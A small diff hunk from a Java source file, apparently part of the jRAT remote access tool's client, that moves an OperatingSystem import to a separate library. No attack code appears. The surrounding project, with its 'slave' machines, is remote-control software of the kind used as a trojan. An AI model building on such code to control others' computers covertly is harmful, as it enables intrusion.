@@ -11,7 +11,8 @@ import javax.swing.filechooser.FileSystemView;
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
 import se.jrat.client.ui.frames.Frame;
-import se.jrat.common.OperatingSystem;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class IconUtils {
